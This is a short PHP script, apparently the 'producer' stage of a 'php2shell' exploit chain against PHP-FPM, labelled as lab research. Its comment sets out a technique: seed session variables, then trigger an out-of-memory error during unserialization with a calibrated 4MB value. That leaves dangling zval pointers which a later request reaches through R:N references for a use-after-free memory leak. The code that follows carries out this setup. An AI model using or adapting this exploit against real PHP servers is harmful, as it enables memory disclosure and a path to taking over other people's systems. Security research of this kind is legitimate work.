<?php
/* php2shell FPM laboratory — arm variant for the no-oracle leak research.
 *
 * Writes a session whose SMALL variables are decoded (and pushed onto the
 * unserialize var_hash) BEFORE the giant tail triggers the producer OOM.
 * The stale BG(unserialize) entries therefore retain dangling zval
 * pointers, which the consume request can reference via R:N without
 * knowing the struct address.
 *
 * The k-strings are long on purpose: after the producer OOM their freed
 * slots become the UAF-read window (R:N binds session 'r' to the stale
 * zval; echoing r dumps whatever reused the freed string buffer). The 4MB
 * tail is calibrated so the producer OOM fires while unserializing the
 * VALUE (the 4MB session file is already resident), i.e. AFTER k0..k3
 * were pushed onto the var_hash. Lab-only scaffold.
 */
session_start();
$_SESSION['k0'] = str_repeat('K', 2000);
$_SESSION['k1'] = str_repeat('L', 2000);
$_SESSION['k2'] = str_repeat('M', 2000);
$_SESSION['k3'] = str_repeat('N', 2000);
$_SESSION['big'] = str_repeat('B', 4 * 1024 * 1024);
echo "BIGVAR_OK\n";
